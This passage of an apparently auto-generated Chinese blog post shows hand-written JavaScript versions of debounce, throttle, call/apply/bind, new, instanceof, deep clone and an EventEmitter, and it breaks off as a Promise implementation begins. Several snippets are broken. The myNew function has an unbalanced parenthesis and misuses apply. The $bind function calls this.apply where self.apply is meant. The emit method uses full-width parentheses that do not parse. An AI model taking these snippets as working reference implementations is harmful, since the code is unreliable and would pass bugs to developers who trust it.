class=\"built_in\">console</span>.log(num),</span><br><span class=\"line\">  (num) =&gt; <span class=\"built_in\">console</span>.error(num)</span><br><span class=\"line\">);</span><br></pre></td></tr></table></figure>","site":{"data":{}},"excerpt":"","more":"<h1 id=\"常见工具函数的实现原理\"><a href=\"#常见工具函数的实现原理\" class=\"headerlink\" title=\"常见工具函数的实现原理\"></a>常见工具函数的实现原理</h1><p>[TOC]</p>\n<h3 id=\"防抖函数\"><a href=\"#防抖函数\" class=\"headerlink\" title=\"防抖函数\"></a>防抖函数</h3><p><strong>防抖</strong>是 N 秒内函数只会被执行一次，如果 N 秒内再次被触发，则重新计算延迟时间（该方法会在最后一次操作的一段时间后才会执行，如 window.keyup、搜索提示等）</p>\n<blockquote>\n<p>类似于狙击手的瞄准过程，狙击手在瞄准目标之后再过一段稳定时间（防止手抖）后才会射击目标</p>\n</blockquote>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">debounce</span>(<span class=\"params\">fn, delay = <span class=\"number\">500</span>, immediate = <span class=\"literal\">false</span></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">let</span> timer;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> args = <span class=\"built_in\">arguments</span>;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> context = <span class=\"built_in\">this</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (immediate &amp;&amp; !timer) &#123;</span><br><span class=\"line\">      fn.apply(context, args);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (timer) &#123;</span><br><span class=\"line\">      <span class=\"built_in\">clearTimeout</span>(timer);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    timer = <span class=\"built_in\">setTimeout</span>(<span class=\"function\">() =&gt;</span> &#123;</span><br><span class=\"line\">      fn.apply(context, args);</span><br><span class=\"line\">    &#125;, delay);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n\n\n<h3 id=\"节流函数\"><a href=\"#节流函数\" class=\"headerlink\" title=\"节流函数\"></a>节流函数</h3><p><strong>节流</strong>是规定一个单位时间，在这个单位时间内最多只能触发一次函数执行（对于频繁操作，任意两次操作只会在一定时间间隔内才会执行，如 window.resize、window.scroll 等事件）</p>\n<blockquote>\n<p>类似于水龙头上的水滴，水滴总会在积累到一定的大小之后才会滴下</p>\n</blockquote>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// throttle 节流阀 </span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">throttle</span>(<span class=\"params\">fn, delay</span>) </span>&#123; </span><br><span class=\"line\">  <span class=\"keyword\">let</span> timeout; </span><br><span class=\"line\">  <span class=\"keyword\">let</span> start = <span class=\"keyword\">new</span> <span class=\"built_in\">Date</span>(); </span><br><span class=\"line\">  <span class=\"keyword\">let</span> threshhold = delay || <span class=\"number\">200</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123; </span><br><span class=\"line\">    <span class=\"keyword\">let</span> context = <span class=\"built_in\">this</span>, </span><br><span class=\"line\">      args = <span class=\"built_in\">arguments</span>, </span><br><span class=\"line\">      curr = <span class=\"keyword\">new</span> <span class=\"built_in\">Date</span>(); </span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">clearTimeout</span>(timeout); <span class=\"comment\">//总是干掉事件回调 </span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (curr - start &gt;= threshhold) &#123; </span><br><span class=\"line\">      fn.apply(context, args); <span class=\"comment\">//只执行一部分方法，这些方法是在某个时间段内执行一次 </span></span><br><span class=\"line\">      start = curr; </span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123; </span><br><span class=\"line\">      <span class=\"comment\">//让方法在脱离事件后也能执行一次 </span></span><br><span class=\"line\">      timeout = <span class=\"built_in\">setTimeout</span>(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123; </span><br><span class=\"line\">          fn.apply(context, args); </span><br><span class=\"line\">      &#125;, threshhold); </span><br><span class=\"line\">    &#125; </span><br><span class=\"line\">  &#125;; </span><br><span class=\"line\">&#125;; </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 该实现比较简单，但问题在于执行的始终是某一时间段内的第一个函数，而不是最后一个，可能并不准确 </span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">throttle</span>(<span class=\"params\">fn, delay = <span class=\"number\">500</span>, immediate = <span class=\"literal\">false</span></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">let</span> timer;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> args = <span class=\"built_in\">arguments</span>;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> context = <span class=\"built_in\">this</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (immediate) &#123;</span><br><span class=\"line\">      fn.apply(context, args);</span><br><span class=\"line\">      immediate = <span class=\"literal\">false</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!timer) &#123;</span><br><span class=\"line\">      timer = <span class=\"built_in\">setTimeout</span>(<span class=\"function\">() =&gt;</span> &#123;</span><br><span class=\"line\">        fn.apply(context, args);</span><br><span class=\"line\">        timer = <span class=\"literal\">null</span>;</span><br><span class=\"line\">      &#125;, delay);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"call、apply-和-bind-函数\"><a href=\"#call、apply-和-bind-函数\" class=\"headerlink\" title=\"call、apply 和 bind 函数\"></a>call、apply 和 bind 函数</h3><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">Function</span>.prototype.$call = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">context</span>) </span>&#123;</span><br><span class=\"line\">  context = context || <span class=\"built_in\">window</span>;</span><br><span class=\"line\">  <span class=\"keyword\">const</span> fn = +<span class=\"keyword\">new</span> <span class=\"built_in\">Date</span>() + <span class=\"string\">&#x27;&#x27;</span> + <span class=\"built_in\">Math</span>.random(); <span class=\"comment\">// 防止同名的 key</span></span><br><span class=\"line\">  context[fn] = <span class=\"built_in\">this</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">const</span> args = [...arguments].slice(<span class=\"number\">1</span>);</span><br><span class=\"line\">  <span class=\"keyword\">const</span> result = <span class=\"built_in\">eval</span>(<span class=\"string\">&#x27;context[fn](&#x27;</span> + args.toString() +<span class=\"string\">&#x27;)&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">delete</span> context[fn];</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">Function</span>.prototype.$apply = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">context, args = []</span>) </span>&#123;</span><br><span class=\"line\">  context = context || <span class=\"built_in\">window</span>;</span><br><span class=\"line\">  <span class=\"keyword\">const</span> fn = +<span class=\"keyword\">new</span> <span class=\"built_in\">Date</span>() + <span class=\"string\">&#x27;&#x27;</span> + <span class=\"built_in\">Math</span>.random(); <span class=\"comment\">// 防止同名的 key</span></span><br><span class=\"line\">  context[fn] = <span class=\"built_in\">this</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">const</span> result = context[fn](...args);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">delete</span> context[fn];</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// Function.prototype.bind 方法的实现</span></span><br><span class=\"line\"><span class=\"built_in\">Function</span>.prototype.$bind = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">context</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> self = <span class=\"built_in\">this</span>;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> args = <span class=\"built_in\">Array</span>.prototype.slice.call(<span class=\"built_in\">arguments</span>, <span class=\"number\">1</span>);</span><br><span class=\"line\">    <span class=\"keyword\">let</span> fBind = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">// 说明：一个绑定函数也能使用 new 操作符创建对象，并需要继承原函数的原型链方法，这种行为就像把原函数当成构造器，提供的 this 值被忽略，同时调用时的参数被提供给模拟函数</span></span><br><span class=\"line\">        <span class=\"comment\">// 通过 new 方法使用该绑定函数时，this 指向新创建的对象，则 this instanceof fBind 成立</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"built_in\">this</span>.apply(<span class=\"built_in\">this</span> <span class=\"keyword\">instanceof</span> fBind ? <span class=\"built_in\">this</span> : context, args.concat(<span class=\"built_in\">arguments</span>));</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">    <span class=\"comment\">// 用于把原型链传递下去</span></span><br><span class=\"line\">    fBind.prototype = <span class=\"built_in\">Object</span>.create(<span class=\"built_in\">this</span>.prototype);</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\">// ES5 中才加入 Object.create() 和 Function.prototype.bind，所以 Function.prototype.bind 不能使用时，Object.create() 也不能使用，所以使用中转函数将原型链传递下去</span></span><br><span class=\"line\">    <span class=\"comment\">// function F () &#123;&#125;</span></span><br><span class=\"line\">    <span class=\"comment\">// F.prototype = this.prototype;</span></span><br><span class=\"line\">    <span class=\"comment\">// fBind.prototype = new F();</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> fBind;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"实现-new-操作符\"><a href=\"#实现-new-操作符\" class=\"headerlink\" title=\"实现 new 操作符\"></a>实现 new 操作符</h3><p>使用 new 操作符创建一个对象时，会进行以下步骤：</p>\n<ol>\n<li>创建（或者说构造）一个全新的对象。</li>\n<li>这个新对象会被执行 [[ 原型 ]] 连接。</li>\n<li>这个新对象会绑定到函数调用的 this 。</li>\n<li>如果函数没有返回其他对象，那么 new 表达式中的函数调用会自动返回这个新对象。</li>\n</ol>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">myNew</span>(<span class=\"params\">fn, ...args</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"comment\">// let obj = &#123;&#125;;</span></span><br><span class=\"line\">  <span class=\"comment\">// obj.__proto__ fn.prototype;</span></span><br><span class=\"line\">  <span class=\"keyword\">let</span> obj = <span class=\"built_in\">Object</span>.create(fn.prototype);</span><br><span class=\"line\">  <span class=\"keyword\">let</span> result = fn.apply(obj, ...args);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> ((result &amp;&amp; <span class=\"keyword\">typeof</span> result === <span class=\"string\">&#x27;object&#x27;</span>) || <span class=\"keyword\">typeof</span> result === <span class=\"string\">&#x27;function&#x27;</span>)) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> obj;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"实现-instanceof-操作符\"><a href=\"#实现-instanceof-操作符\" class=\"headerlink\" title=\"实现 instanceof 操作符\"></a>实现 instanceof 操作符</h3><p><strong>instanceof 的原理</strong>是右侧对象的原型对象（prototype ）是否在左侧对象的原型链上面</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">myInstanceof</span>(<span class=\"params\">left, right</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">let</span> leftProp = left.__proto__;</span><br><span class=\"line\">  <span class=\"keyword\">let</span> rightProp = right.prototype;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// 一直会执行循环  直到函数return</span></span><br><span class=\"line\">  <span class=\"keyword\">while</span> (<span class=\"literal\">true</span>) &#123;</span><br><span class=\"line\">    <span class=\"comment\">// 遍历到了原型链最顶层</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (leftProp === <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (leftProp === rightProp) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">      <span class=\"comment\">// 遍历赋值__proto__做对比</span></span><br><span class=\"line\">      leftProp = leftProp.__proto__;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"实现深度拷贝\"><a href=\"#实现深度拷贝\" class=\"headerlink\" title=\"实现深度拷贝\"></a>实现深度拷贝</h3><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 定义一个深拷贝函数  接收目标target参数</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">deepClone</span>(<span class=\"params\">target</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> result;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"keyword\">typeof</span> target === <span class=\"string\">&#x27;object&#x27;</span>) &#123; <span class=\"comment\">// 如果当前需要深拷贝的是一个对象的话</span></span><br><span class=\"line\">      <span class=\"keyword\">if</span> (<span class=\"built_in\">Array</span>.isArray(target)) &#123;</span><br><span class=\"line\">        result = []; <span class=\"comment\">// 将result赋值为一个数组，并且执行遍历</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i <span class=\"keyword\">in</span> target) &#123;</span><br><span class=\"line\">          result.push(deepClone(target[i]))</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (target === <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">        result = <span class=\"literal\">null</span>;</span><br><span class=\"line\">      &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span>(target.constructor === <span class=\"built_in\">RegExp</span>)&#123;</span><br><span class=\"line\">        result = target;</span><br><span class=\"line\">      &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        result = &#123;&#125;;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i <span class=\"keyword\">in</span> target) &#123;</span><br><span class=\"line\">          result[i] = deepClone(target[i]);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123; <span class=\"comment\">// 如果不是对象的话，就是基本数据类型，那么直接赋值</span></span><br><span class=\"line\">      result = target;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 如果是基本数据类型，直接返回</span></span><br><span class=\"line\"><span class=\"comment\">// 如果是 RegExp 或者 Date 类型，返回对应类型</span></span><br><span class=\"line\"><span class=\"comment\">// 如果是复杂数据类型，递归。</span></span><br><span class=\"line\"><span class=\"comment\">// 考虑循环引用的问题</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">deepClone</span>(<span class=\"params\">obj, hash = <span class=\"keyword\">new</span> <span class=\"built_in\">WeakMap</span>()</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"comment\">//递归拷贝</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (obj <span class=\"keyword\">instanceof</span> <span class=\"built_in\">RegExp</span>) <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"built_in\">RegExp</span>(obj);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (obj <span class=\"keyword\">instanceof</span> <span class=\"built_in\">Date</span>) <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"built_in\">Date</span>(obj);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (obj === <span class=\"literal\">null</span> || <span class=\"keyword\">typeof</span> obj !== <span class=\"string\">&quot;object&quot;</span>) &#123;</span><br><span class=\"line\">    <span class=\"comment\">//如果不是复杂数据类型，直接返回</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> obj;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (hash.has(obj)) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> hash.get(obj);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">   * 如果obj是数组，那么 obj.constructor 是 [Function: Array]</span></span><br><span class=\"line\"><span class=\"comment\">   * 如果obj是对象，那么 obj.constructor 是 [Function: Object]</span></span><br><span class=\"line\"><span class=\"comment\">   */</span></span><br><span class=\"line\">  <span class=\"keyword\">let</span> t = <span class=\"keyword\">new</span> obj.constructor();</span><br><span class=\"line\">  hash.set(obj, t);</span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> key <span class=\"keyword\">in</span> obj) &#123;</span><br><span class=\"line\">    <span class=\"comment\">//递归</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (obj.hasOwnProperty(key)) &#123;</span><br><span class=\"line\">      <span class=\"comment\">//是否是自身的属性</span></span><br><span class=\"line\">      t[key] = deepClone(obj[key], hash);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> t;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"EventEmitter-发布订阅模式\"><a href=\"#EventEmitter-发布订阅模式\" class=\"headerlink\" title=\"EventEmitter (发布订阅模式)\"></a>EventEmitter (发布订阅模式)</h3><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 手写发布订阅模式 EventEmitter</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">EventEmitter</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"function\"><span class=\"title\">constructor</span>(<span class=\"params\"></span>)</span> &#123;</span><br><span class=\"line\">    <span class=\"built_in\">this</span>.events = <span class=\"built_in\">Object</span>.create(<span class=\"literal\">null</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// 实现订阅</span></span><br><span class=\"line\">  <span class=\"function\"><span class=\"title\">on</span>(<span class=\"params\">type, callBack</span>)</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!<span class=\"built_in\">this</span>.events[type]) &#123;</span><br><span class=\"line\">      <span class=\"built_in\">this</span>.events[type] = [];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">this</span>.events[type].push(callBack);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// 删除订阅</span></span><br><span class=\"line\">  <span class=\"function\"><span class=\"title\">off</span>(<span class=\"params\">type, callBack</span>)</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!<span class=\"built_in\">this</span>.events[type]) <span class=\"keyword\">return</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">this</span>.events[type] = <span class=\"built_in\">this</span>.events[type].filter(<span class=\"function\"><span class=\"params\">item</span> =&gt;</span> &#123;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> item !== callBack;</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// 只执行一次订阅事件</span></span><br><span class=\"line\">  <span class=\"function\"><span class=\"title\">once</span>(<span class=\"params\">type, callBack</span>)</span> &#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">fn</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">      callBack();</span><br><span class=\"line\">      <span class=\"built_in\">this</span>.off(type, fn);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"built_in\">this</span>.on(type, fn);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"comment\">// 触发事件</span></span><br><span class=\"line\">  <span class=\"function\"><span class=\"title\">emit</span>(<span class=\"params\">type, ...rest</span>)</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>（<span class=\"built_in\">this</span>.events[type]）&#123;</span><br><span class=\"line\">      <span class=\"built_in\">this</span>.events[type].forEach(<span class=\"function\"><span class=\"params\">fn</span> =&gt;</span> fn.apply(<span class=\"built_in\">this</span>, rest))</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n<h3 id=\"Promise-实现\"><a href=\"#Promise-实现\" class=\"headerlink\" title=\"Promise 实现\"></a>Promise 实现</h3><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span 